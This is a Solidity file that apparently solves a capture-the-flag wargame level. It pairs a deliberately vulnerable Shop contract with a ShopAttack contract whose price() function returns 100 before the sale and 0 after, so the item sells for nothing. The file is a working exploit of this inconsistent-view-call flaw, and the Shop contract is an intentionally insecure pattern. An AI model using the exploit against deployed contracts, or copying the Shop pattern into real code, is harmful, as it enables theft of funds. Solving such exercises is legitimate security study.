// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Buyer {
  function price() external view returns (uint);
}

contract Shop {
  uint public price = 100;
  bool public isSold;

  function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
      isSold = true;
      price = _buyer.price();
    }
  }
}

contract ShopAttack {

    Shop toAttack;
    uint callCount;

    constructor(address _levelInstance) public {
        toAttack = Shop(_levelInstance);
    }

    function attack() public {
        toAttack.buy();
    }

    function price() external view returns (uint) {
        bool isSold = toAttack.isSold();
        if (isSold) {
            return 0;
        } else {
            return 100;
        }
    }
}